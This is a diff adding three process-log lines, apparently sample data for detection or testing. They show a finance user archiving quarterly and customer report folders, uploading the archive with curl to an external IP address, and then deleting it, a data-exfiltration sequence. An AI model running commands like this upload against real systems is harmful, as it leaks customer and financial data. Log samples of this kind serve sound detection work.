@@ -1,0 +1,3 @@
+2026-08-24T16:30:00Z host=files11 user=finance pid=15130 process=tar command="tar -czf /tmp/q3-export.tgz /srv/reports/q3 /srv/reports/customers"
+2026-08-24T16:41:55Z host=files11 user=finance pid=15140 process=curl command="curl https://203.0.113.230/upload -F file=@/tmp/q3-export.tgz"
+2026-08-24T16:43:00Z host=files11 user=finance pid=15145 process=rm command="rm /tmp/q3-export.tgz"
